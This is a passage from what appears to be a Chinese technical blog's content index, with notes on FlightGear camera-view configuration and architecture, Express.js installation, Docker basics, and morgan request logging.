&lt;&#x2F;camera&gt;</span><br><span class="line">      &lt;camera&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Right-Down&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;window&gt;</span><br><span class="line">          &lt;name&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view&gt;</span><br><span class="line">          &lt;heading-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;heading-deg&gt;</span><br><span class="line">          &lt;roll-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;roll-deg&gt;</span><br><span class="line">          &lt;pitch-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;pitch-deg&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;viewport&gt;</span><br><span class="line">          &lt;x&gt;1600&lt;&#x2F;x&gt;</span><br><span class="line">          &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">          &lt;width&gt;320&lt;&#x2F;width&gt;</span><br><span class="line">          &lt;height&gt;180&lt;&#x2F;height&gt;</span><br><span class="line">        &lt;&#x2F;viewport&gt;</span><br><span class="line"></span><br><span class="line">      &lt;&#x2F;camera&gt;</span><br><span class="line">      &lt;camera&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Right-Up&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;window&gt;</span><br><span class="line">          &lt;name&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view&gt;</span><br><span class="line">          &lt;heading-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;heading-deg&gt;</span><br><span class="line">          &lt;roll-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;roll-deg&gt;</span><br><span class="line">          &lt;pitch-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;pitch-deg&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;viewport&gt;</span><br><span class="line">          &lt;x&gt;1600&lt;&#x2F;x&gt;</span><br><span class="line">          &lt;y&gt;900&lt;&#x2F;y&gt;</span><br><span class="line">          &lt;width&gt;320&lt;&#x2F;width&gt;</span><br><span class="line">          &lt;height&gt;180&lt;&#x2F;height&gt;</span><br><span class="line">        &lt;&#x2F;viewport&gt;</span><br><span class="line"></span><br><span class="line">      &lt;&#x2F;camera&gt;</span><br><span class="line">    &lt;&#x2F;camera-group&gt;</span><br><span class="line">&lt;&#x2F;PropertyList&gt;</span><br></pre></td></tr></table></figure>

<p>在FGDATA文件夹根目录下找到defaults.xml配置文件，修改如下配置内容，加入camera-views.xml配置文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;rendering include&#x3D;&quot;camera-views.xml&quot;&gt;</span><br><span class="line">&lt;&#x2F;rendering&gt;</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://forum.flightgear.org/viewtopic.php?f=24&t=36230&sid=5a8c6daf6d52ff5fcb520a54c4de4a24" target="_blank" rel="noopener">Multi-Display setup</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Howto:Configure_camera_view_windows" target="_blank" rel="noopener">Howto:Configure camera view windows</a>,by flightgear.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行仿真</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Expressjs框架的安装使用</title>
    <url>/2019/07/18/Expressjs%E6%A1%86%E6%9E%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Express是高度包容、快速而极简的 Node.js Web 框架。下面简单介绍Express框架的安装和使用。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装最新Nodejs长期支持版"><a href="#安装最新Nodejs长期支持版" class="headerlink" title="安装最新Nodejs长期支持版"></a>安装最新Nodejs长期支持版</h2><p>前往<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">nodejs官方网站</a>下载其最新长期支持版，并安装。</p>
<h2 id="安装Express生成器"><a href="#安装Express生成器" class="headerlink" title="安装Express生成器"></a>安装Express生成器</h2><p>Express生成器是一个脚手架工具，能够快速生成标准的Express Web框架，简化开发过程。具体安装方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g express-generator@4</span><br></pre></td></tr></table></figure>

<p>创建APP：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ express &#x2F;tmp&#x2F;foo &amp;&amp; cd &#x2F;tmp&#x2F;foo</span><br></pre></td></tr></table></figure>

<p>安装依赖：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>启动Web服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 直接启动</span><br><span class="line">npm start</span><br><span class="line"># 调试启动</span><br><span class="line">SET DEBUG&#x3D;server:* &amp; npm start</span><br></pre></td></tr></table></figure>

<p>访问网站： <a href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a></p>
<h1 id="express-vs-koa-vs-hapi"><a href="#express-vs-koa-vs-hapi" class="headerlink" title="express vs koa vs hapi"></a>express vs koa vs hapi</h1><p>请参考<a href="https://medium.com/savvycom/the-best-node-js-framework-koa-vs-express-vs-hapi-detailed-comparison-46cc85207d65" target="_blank" rel="noopener">The Best Node.js Framework: Koa VS Express VS Hapi [Detailed Comparison]</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://expressjs.com/zh-cn/" target="_blank" rel="noopener">Express</a>,by Express homepage.</li>
<li><a href="https://github.com/expressjs/express" target="_blank" rel="noopener">Express github</a>,by Express github.</li>
<li><a href="https://medium.com/savvycom/the-best-node-js-framework-koa-vs-express-vs-hapi-detailed-comparison-46cc85207d65" target="_blank" rel="noopener">The Best Node.js Framework: Koa VS Express VS Hapi [Detailed Comparison]</a>,by Savvycom JSC.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用帮助</title>
    <url>/2018/10/19/Docker%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
<p>Docker与传统虚拟机如virtualbox、vmware相比，占用资源少，更加轻便，启动快，更适用于解决软件环境配置难题。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol>
<li><p>镜像</p>
<p>Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>
</li>
<li><p>容器</p>
</li>
</ol>
<p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
<ol start="3">
<li>仓库</li>
</ol>
<p>镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry 就是这样的服务。</p>
<p>一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。</p>
<p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 &lt;仓库名&gt;:&lt;标签&gt; 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。</p>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="操作镜像"><a href="#操作镜像" class="headerlink" title="操作镜像"></a>操作镜像</h2><h3 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h3><p>Docker Hub 上有大量的高质量的镜像可以用，使用docker pull命令拉取镜像。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 拉取镜像</span><br><span class="line">$ docker pull ubuntu:16.04</span><br><span class="line">&#x2F;&#x2F; 以该镜像启动容器</span><br><span class="line">$ docker run -it --rm ubuntu:16.04 bash</span><br></pre></td></tr></table></figure>

<p>docker run 就是运行容器的命令,其参数含义如下：</p>
<ul>
<li>-it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。</li>
<li>–rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。</li>
<li>ubuntu:16.04：这是指用 ubuntu:16.04 镜像为基础来启动容器。</li>
<li>bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash。</li>
</ul>
<h3 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>

<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><p>删除本地镜像格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker image rm [选项] &lt;镜像1&gt; [&lt;镜像2&gt; ...]</span><br></pre></td></tr></table></figure>
<p>以删除hello-world镜像为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker image rm hello-world</span><br></pre></td></tr></table></figure>

<h2 id="操作容器"><a href="#操作容器" class="headerlink" title="操作容器"></a>操作容器</h2><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 新建并启动容器</span><br><span class="line">docker run ubuntu:14.04 &#x2F;bin&#x2F;echo &#39;Hello world&#39;</span><br><span class="line">&#x2F;&#x2F; 启动已终止容器</span><br><span class="line">docker container start</span><br></pre></td></tr></table></figure>

<h3 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 后台运行容器</span><br><span class="line">$ docker run -d ubuntu:17.10 &#x2F;bin&#x2F;sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br><span class="line">&#x2F;&#x2F; 通过 docker container ls 命令来查看容器信息</span><br><span class="line">$ docker container ls</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过 docker container logs 命令获取容器的输出信息</span><br><span class="line">$ docker container logs [container ID or NAMES]</span><br></pre></td></tr></table></figure>

<h3 id="终止容器"><a href="#终止容器" class="headerlink" title="终止容器"></a>终止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container stop</span><br></pre></td></tr></table></figure>

<h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><p>在使用 -d 参数时，容器启动后会进入后台。</p>
<p>某些时候需要进入容器进行操作，包括使用 docker attach 命令或 docker exec 命令，推荐大家使用 docker exec 命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -dit ubuntu</span><br><span class="line">$ docker container ls</span><br><span class="line">$ docker exec -i 69d1 bash</span><br><span class="line">$ docker exec -it 69d1 bash</span><br></pre></td></tr></table></figure>
<p>如果从这个 stdin 中 exit，不会导致容器的停止。这就是为什么推荐大家使用 docker exec 的原因。</p>
<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 删除一个处于终止状态的容器</span><br><span class="line">$ docker container rm  trusting_newton</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 清理所有处于终止状态的容器</span><br><span class="line">docker container prune</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://yeasy.gitbooks.io/docker_practice/introduction/what.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/introduction/what.html</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a> ，by 阮一峰</li>
<li><a href="https://zh.wikipedia.org/wiki/Docker" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Docker</a> ,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>FlightGear技术分析</title>
    <url>/2019/01/24/FlightGear%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>FlightGear是一个始于1997年多平台飞行模拟器、开源软件项目<sup>[1]</sup>。该项目适用的操作系统主要包括Linux、Microsoft Windows和Mac OS X，采用C++编写。</p>
<h1 id="FlightGear体系结构"><a href="#FlightGear体系结构" class="headerlink" title="FlightGear体系结构"></a>FlightGear体系结构</h1><h2 id="当前体系结构"><a href="#当前体系结构" class="headerlink" title="当前体系结构"></a>当前体系结构</h2><p>FlightGear体系结构基于一个名为“主循环”的无限循环<sup>[2]</sup>。其流程图如图1所示。在主循环中将依次完成如下工作:</p>
<ul>
<li>ATC模拟</li>
<li>控制AI对象</li>
<li>在多用户环境中更新其他飞机</li>
<li>飞行动力学计算</li>
<li>风景更新</li>
<li>音频调度</li>
<li>渲染</li>
</ul>
<p align="center">
    <img src="images/flightgear_mainloop.jpg" width="40%" alt="FlightGear主循环流程图"/>
</p>
<center>图1  FlightGear主循环流程图</center>

<h2 id="高级体系结构"><a href="#高级体系结构" class="headerlink" title="高级体系结构"></a>高级体系结构</h2><p>FlightGear正在支持高级体系结构(High Level Architecture, HLA)<sup>[3][4]</sup>。</p>
<h3 id="HLA简介"><a href="#HLA简介" class="headerlink" title="HLA简介"></a>HLA简介</h3><p><strong>高级体系结构（HLA）是分布式仿真的标准，用于通过组合（联合）多个仿真来构建用于更大目的的仿真</strong>。该标准是在美国国防部的领导下于90年代开发的，后来转变为开放的国际IEEE标准。它是北约通过STANAG 4603推荐的标准。今天，HLA被用于许多领域，包括国防和安全以及民用应用。该体系结构指定以下组件：</p>
<ul>
<li>运行时基础结构（RTI），通过不同的编程语言提供标准化的服务集。这些服务包括信息交换，同步和联合管理</li>
<li>联邦成员（Federates）是使用RTI服务的单独仿真系统，由多个联邦成员对象构成。</li>
<li>联邦成员对象模型（FOM），指定用于交换数据的对象类和交互类。 FOM可以描述任何域的信息。</li>
</ul>
<p align="center">
    <img src="images/HLA_Federation.png" width="90%" alt="HLA构成"/>
</p>
<center>图2  HLA构成</center>

<p>HLA标准由三部分组成：</p>
<ul>
<li>IEEE Std 1516-2010框架和规则，它规定了组件或整个联合应遵守的十个体系结构规则。</li>
<li>IEEE Std 1516.1-2010联邦接口规范，规定了RTI应提供的服务。这些服务以C ++和Java API以及Web服务的形式提供。</li>
<li>IEEE Std 1516.2-2010对象模型模板规范，它规定了HLA对象模型（如FOM）应使用的格式。</li>
</ul>
<h3 id="HLA优势"><a href="#HLA优势" class="headerlink" title="HLA优势"></a>HLA优势</h3><p>与单机仿真相比，这有三大优势<sup>[5]</sup>（例如FlightGear V3.6）：</p>
<ul>
<li>它提供了一个强大的环境，使模拟器具有多线程，利用具有多个内核的计算机，或者在不同的计算机（甚至包括不同的平台和操作系统）上运行模拟的不同部分。</li>
<li>它允许我们分离模拟器的部分，如AI（通过解耦AI交通系统）、FDM、Nasal脚本和渲染器，以及较少时间关键的子系统，如天气，这样我们就可以获得一致（也许更高）的帧速率（即减少Nasal垃圾收集对帧速率的影响）。</li>
<li>它提供了一个非常好的框架，允许任何人使用除C / C ++之外的编程语言（想想Ada，Java，Python等）创建与FlightGear交互的组件，这些编程语言可能在他们自己的线程中运行，并且驻留在单独的二进制文件中，这也更容易调试/排除故障（想想回归测试，即在专用的gdb / valgrind会话中运行一个自包含的子系统），而不必知道如何修改/补丁和重建FlightGear。</li>
</ul>
<h1 id="FlightGear组件构成"><a href="#FlightGear组件构成" class="headerlink" title="FlightGear组件构成"></a>FlightGear组件构成</h1><p>FlightGear由很多开源组件或程序构成<sup>[6]</sup>，具体包括：</p>
<h2 id="RTI"><a href="#RTI" class="headerlink" title="RTI"></a>RTI</h2><p>RTI是HLA架构的关键组件，相当于中间件。</p>
<h3 id="OpenRTI"><a href="#OpenRTI" class="headerlink" title="OpenRTI"></a>OpenRTI</h3><p>OpenRTI是一个包含了rti 1.3、rti 1516、rti 1516e标准接口实现的rti库。OpenRTI有如下关键特性：</p>
<ul>
<li>易用性高，非常便于使用；</li>
<li>直接提供C++调用接口，也可以提供Java接口，但目前还没有编码实现；</li>
<li>可扩展性强；</li>
<li>一直在维护中的RTI开源项目；</li>
<li>树状的服务器结构；</li>
<li>最短路径在内存中不拷贝数据；</li>
<li>不依赖其它项目，仅仅需要C++编译器，特别的不需要boost；</li>
<li>支持线程间通信、rti通信和管道间通信，未来可能支持http通信；</li>
<li>到处都可以运行，能够在Linux、Win32、MacOS和Solaris上运行。</li>
</ul>
<h2 id="FDM"><a href="#FDM" class="headerlink" title="FDM"></a>FDM</h2><p>飞行动力学模型（Flight Dynamics Model, FDM）是模拟器内控制飞机物理飞行的数学模型。飞机的3D模型实质是一张图片，其与飞行动力学无关，本质上由FDM控制飞机如何飞行。在FlightGear中主要使用JSBSim和YASim两个飞行动力学模型。</p>
<h3 id="JSBSim"><a href="#JSBSim" class="headerlink" title="JSBSim"></a>JSBSim</h3><p>JSBSim是一个用C++实现的开源跨平台飞行器动力学模型软件。Flightgear也采用了JSBSim作为其中的飞行器动力模型之一。同时JSBSim也可以作为一个单独的动力学模型软件进行运行。</p>
<h3 id="YASim"><a href="#YASim" class="headerlink" title="YASim"></a>YASim</h3><p>YASim使用飞机的几何形状生成基本飞行特征。虽然这表明了一种“现实的”或开箱即用的方法，但在获得接近现实主义的结果之前，这只是一种粗略的近似，需要进行大量的调整。如果您的飞机有稳定的飞行数据，例如风洞数据，或者您希望最终生成超逼真的模拟，那么JSBSim可能是更好的方法。 如果你缺乏这样的数据但是知道飞机的几何形状并且能够获得与真实飞行员相同的飞行特性和限制，那么YASim可以提供足以满足大多数模拟需求的解决方案。</p>
<h2 id="Atlas"><a href="#Atlas" class="headerlink" title="Atlas"></a>Atlas</h2><p>Atlas旨在为FlightGear（一种开源飞行模拟器）的用户制作和展示世界高质量的图表。 这是通过两个主要部分实现的：地图创建者（简称为Map）和Atlas查看器。</p>
<ul>
<li><p>地图创建者从FlightGear获取风景数据并将其转换为漂亮的地图图片，可以使用您可能已安装的任何位图图像程序或使用Atlas查看应用程序查看。</p>
</li>
<li><p>Atlas查看应用程序可用于浏览您的地图，但也可以直接连接到FlightGear，并在所谓的移动地图显示上显示您的飞机当前位置。</p>
</li>
</ul>
<h2 id="FlightGear-Multiplayer-Server"><a href="#FlightGear-Multiplayer-Server" class="headerlink" title="FlightGear Multiplayer Server"></a>FlightGear Multiplayer Server</h2><p>FGMS或FlightGear多人游戏服务器是FlightGear的独立网络服务器，并根据GPL许可。它允许通过FGFS内的网络与其他飞行员一起飞行。</p>
<p>可以在服务器配置中配置的服务器列表类型：</p>
<ul>
<li>中继服务器 - 网络中的其他服务器。 每个都必须有完整的列表（减去自己）以获得适当的网络功能。</li>
<li>交叉馈送服务器 - 服务器从本地用户和其他服务器接收的所有内容都将转发到交叉馈送服务器。 用于在同一主机上运行多个连接的fgms实例，例如 用于提供跟踪和未跟踪服务，而不会产生额外的外部流量。</li>
<li>跟踪器 - 服务器每10秒向跟踪器发送一个每个本地用户的摘要更新。</li>
<li>HUB  - 通常服务器不会将从服务器接收的数据包发送到其他中继。 HUB服务器将数据从服务器发送到它知道的所有中继。</li>
</ul>
<h2 id="FGCOM"><a href="#FGCOM" class="headerlink" title="FGCOM"></a>FGCOM</h2><p>FGCom是一种语音通信功能。这样您就可以在飞行途中与其他飞行员和空域管制员进行通信。</p>
<p>主要思想是重现真实的航空通信，换句话说，此功能旨在使您的航班期间尽可能真实地进行无线电通信。</p>
<p>FGCom有两种方式：</p>
<p>集成到FlightGear（FGCom内置）：这当然是更好的解决方案，因为更容易使用<br>外部软件（FGCom standalone）：只有在计划在特殊情况下使用FGCom时才应使用此软件</p>
<h2 id="MPmap"><a href="#MPmap" class="headerlink" title="MPmap"></a>MPmap</h2><p>MPMap是一个实用程序，可以在世界地图上显示在FlightGear世界中飞行的飞机。 除此之外，它还提供对导航数据的访问，例如ILS频率，跑道号和修正。由于它使用谷歌地图，人们可以选择地图或卫星视图。</p>
<h2 id="SimGear"><a href="#SimGear" class="headerlink" title="SimGear"></a>SimGear</h2><p>SimGear是FlightGear使用的一组开源软件库。该项目仍在开发中，但其目标是成为“仿真内核”，并由其他非FlightGear项目使用。该项目于2000年启动。SimGear与FlightGear和TerraGear一样，需要PLIB进行构建。</p>
<p>SimGear是一个仿真架构工具集(simulation construction tools)，是FlightGear的仿真引擎，完成了数据结构操作、星历计算、模拟天空、坐标系转换等大部分的工作，它也是一个开源库。</p>
<h2 id="PLib"><a href="#PLib" class="headerlink" title="PLib"></a>PLib</h2><p>PLIB（便携式游戏库）是由Steve J. Baker编写的一套用于编写游戏的软件库。 FlightGear在其大部分开发中使用了PLIB。 它也被FlightGear相关程序Atlas使用。 PLIB是开源的，并且是在GNU Library General Public License下发布的。</p>
<p>FlightGear 1.0（2007年发布）是在向OpenSceneGraph（OSG）过渡之前使用PLIB进行3D场景图的最后一次公开发布。 FlightGear仍然使用PLIB执行各种任务; 例如，读取操纵杆输入并显示图形用户界面（GUI）。 在后一种用法中，PLIB的PUI组件最终将由Canvas和Phi在FlightGear中替换，这将极大地改善当前GUI的功能，超出PUI提供的功能。</p>
<p>构建FlightGear时需要PLIB。</p>
<h2 id="OSG"><a href="#OSG" class="headerlink" title="OSG"></a>OSG</h2><p>OSG是OpenSceneGraph的缩写，OpenSceneGraph图形系统是一个基于工业标准OpenGL的软件接口，它让程序员能够更加快速、便捷地创建高性能、跨平台的交互式图形程序。相比于工业标准OpenGL或者其他图形库，OpenSceneGraph的优点明显，除了程序开源和平台无关性以外，其封装并提供了数量众多的提升程序运行时性能的算法、针对包括分页数据库在内的几乎所有的主流数据格式的直接数据接口、 以及针对脚本语言系统Pthyon和Tcl的支持。 </p>
<p>OpenGL是Open Graphics Library的缩写，其独立于硬件，独立于窗口系统，在运行各种操作系统的各种计算机上都可用，并能在网络环境下以客户/服务器模式工作，是专业图形处理、科学计算等高端应用领域的标准图形库。</p>
<h2 id="场景相关工具"><a href="#场景相关工具" class="headerlink" title="场景相关工具"></a>场景相关工具</h2><h3 id="TerraSync"><a href="#TerraSync" class="headerlink" title="TerraSync"></a>TerraSync</h3><p>要查看飞机下方的地形，您必须安装相应的风景。这可以通过在安装风景的文章中描述的在飞行之前下载某些景点来实现。</p>
<p>或者，如果您有稳定且相当快速的互联网连接，则可以使用TerraSync。它是一个实用程序，可在模拟器运行时自动下载所需FlightGear场景的最新版本。 TerraSync在后台运行（可选择作为单独的进程），监视您的位置，并从“主时间”服务器“及时”下载（或更新）最新的场景。一段时间以来，TerraSync已经集成到核心FlightGear流程中，因此不需要为典型用户处理TerraSync。</p>
<p>TerraSync的主存储库，即TerraSync从中下载文件的在线资源，每天与FlightGear Scenery数据库同步一次。因此，当使用TerraSync时，您将永远拥有</p>
<ul>
<li>最新的.stg文件，告诉FlightGear放置对象的位置</li>
<li>最新的对象静态模型。 （静态模型定义仅存在于一个地方的唯一对象，例如着名的建筑物或地标。）</li>
<li>最新的对象共享模型。 （通用模型在不同的地方使用不止一次，每个都可以代表许多不同的对象，如通用房屋或船舶）</li>
</ul>
<h3 id="TerrGear"><a href="#TerrGear" class="headerlink" title="TerrGear"></a>TerrGear</h3><p>TerraGear是开源工具和渲染库的集合，可以在地球的3D表示（即3D模型或3D地图）中转换公开可用的GIS数据，以用于实时渲染项目。 TerraGear可以导入3D数据集，例如DEM地形网格，2D多边形数据集（如海岸线，城市轮廓，湖泊轮廓）和2D栅格数据集，例如1 km NAOO土地利用/土地覆盖数据。它还具有基于可用的FAA数据生成逼真的机场，跑道和照明的工具。</p>
<p>TerraGear是用于为FlightGear项目生成场景的主要工具。</p>
<p>如果没有terragear，可以更改Terrain纹理，但不能更改地形。如果要更改城市的纹理，请更改材质文件。如果你想改变海岸线，你需要terragear。检查目录FGDATA/Material中的材料文件，你需要terragear。</p>
<h1 id="FlightGear事件处理"><a href="#FlightGear事件处理" class="headerlink" title="FlightGear事件处理"></a>FlightGear事件处理</h1><p>请参考<a href="https://sourceforge.net/p/flightgear/fgdata/ci/next/tree/Docs/README.commands" target="_blank" rel="noopener">FlightGear Command Doc</a></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/FlightGear" target="_blank" rel="noopener">FlightGear</a>,by wikipedia.</li>
<li><a href="http://wiki.flightgear.org/images/1/1e/New_FG_architecture.pdf" target="_blank" rel="noopener">A NEW ARCHITECTURE FOR FLIGHTGEAR FLIGHT SIMULATOR</a>,by flightgear.</li>
<li><a href="http://wiki.flightgear.org/FlightGear_high-level_architecture_support" target="_blank" rel="noopener">FlightGear high-level architecture support</a>,by flightgear</li>
<li><a href="http://wiki.flightgear.org/Developing_with_HLA" target="_blank" rel="noopener">Developing with HLA</a>,by flightgear.</li>
<li><a href="http://wiki.flightgear.org/High-Level_Architecture" target="_blank" rel="noopener">High-Level Architecture</a>,by flightgear.</li>
<li><a href="https://en.wikipedia.org/wiki/High-level_architecture" target="_blank" rel="noopener">High-level architecture</a>,by wikipedia.</li>
<li><a href="http://wiki.flightgear.org/FlightGear_related_projects" target="_blank" rel="noopener">FlightGear related projects</a>,by wikipedia.</li>
<li><a href="https://sourceforge.net/p/openrti/wiki/Home/" target="_blank" rel="noopener">OpenRTI</a>,by openrti.</li>
<li><a href="https://en.wikipedia.org/wiki/JSBSim" target="_blank" rel="noopener">JSBSim</a>,by wikipedia.</li>
<li><a href="http://wiki.flightgear.org/YASim" target="_blank" rel="noopener">YASim</a>,by flightgear.</li>
<li><a href="http://wiki.flightgear.org/JSBSim_vs_YASim" target="_blank" rel="noopener">JSBSim vs YASim</a>,by flightgear.</li>
<li><a href="http://atlas.sourceforge.net/" target="_blank" rel="noopener">Atlas</a>,by atlas.</li>
<li><a href="http://wiki.flightgear.org/FGCom_3.0" target="_blank" rel="noopener">FGCom 3.0</a>,by wikipedia.</li>
<li><a href="http://wiki.flightgear.org/FlightGear_Multiplayer_Server" target="_blank" rel="noopener">FlightGear Multiplayer Server</a>,by flightgear.</li>
<li><a href="http://wiki.flightgear.org/SimGear" target="_blank" rel="noopener">SimGear</a>,by flightgear.</li>
<li><a href="http://wiki.flightgear.org/PLIB" target="_blank" rel="noopener">PLIB</a>,by flightgear.</li>
<li><a href="http://wiki.flightgear.org/OSG" target="_blank" rel="noopener">OSG</a>,by flightgear.</li>
<li><a href="https://blog.csdn.net/qq_24848645/article/details/44177635" target="_blank" rel="noopener">Flightgear操作方式以及几种典型飞机的起飞方法</a>,by Mosquito_蚊子.</li>
<li><a href="https://segmentfault.com/a/1190000018056453" target="_blank" rel="noopener">Sentry的使用</a>,by KJxiaoxiao.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Expressjs组件morgan保存日志到文件的方法</title>
    <url>/2019/07/24/Expressjs%E7%BB%84%E4%BB%B6morgan%E4%BF%9D%E5%AD%98%E6%97%A5%E5%BF%97%E5%88%B0%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>morgan是express默认的日志中间件，也可以脱离express，作为node.js的日志组件单独使用。</p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="将日志打印到本地文件"><a href="#将日志打印到本地文件" class="headerlink" title="将日志打印到本地文件"></a>将日志打印到本地文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var express &#x3D; require(&#39;express&#39;);</span><br><span class="line">var app &#x3D; express();</span><br><span class="line">var morgan &#x3D; require(&#39;morgan&#39;);</span><br><span class="line">var fs &#x3D; require(&#39;fs&#39;);</span><br><span class="line">var path &#x3D; require(&#39;path&#39;);</span><br><span class="line"></span><br><span class="line">var accessLogStream &#x3D; fs.createWriteStream(path.join(__dirname, &#39;access.log&#39;), &#123;flags: &#39;a&#39;&#125;);</span><br><span class="line"></span><br><span class="line">app.use(morgan(&#39;short&#39;, &#123;stream: accessLogStream&#125;));</span><br><span class="line">app.use(function(req, res, next)&#123;</span><br><span class="line">    res.send(&#39;ok&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000);</span><br></pre></td></tr></table></figure>

